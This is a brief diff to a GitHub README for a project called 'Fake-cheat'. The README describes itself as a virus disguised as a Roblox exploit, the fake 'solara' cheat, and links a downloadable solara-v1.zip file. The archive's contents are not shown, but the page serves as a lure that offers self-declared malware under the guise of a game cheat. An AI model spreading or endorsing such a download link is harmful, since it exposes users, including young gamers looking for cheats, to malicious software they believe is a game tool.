@@ -1,4 +1,3 @@
-<code> 
 ## Fake-cheat
 ###### a virus about the HACOK'S doom, hides as a roblox-exploit.
 Welcome to the HACOK'S DOOM! This is the fake solara cheat
@@ -21,4 +20,4 @@ So if you already downloaded, all action is at your own risk
 
 ## The solara
 
-[solara-v1.zip](https://github.com/user-attachments/files/26447211/solara-v1.zip) </code>
+<code> [solara-v1.zip](https://github.com/user-attachments/files/26447211/solara-v1.zip) </code>
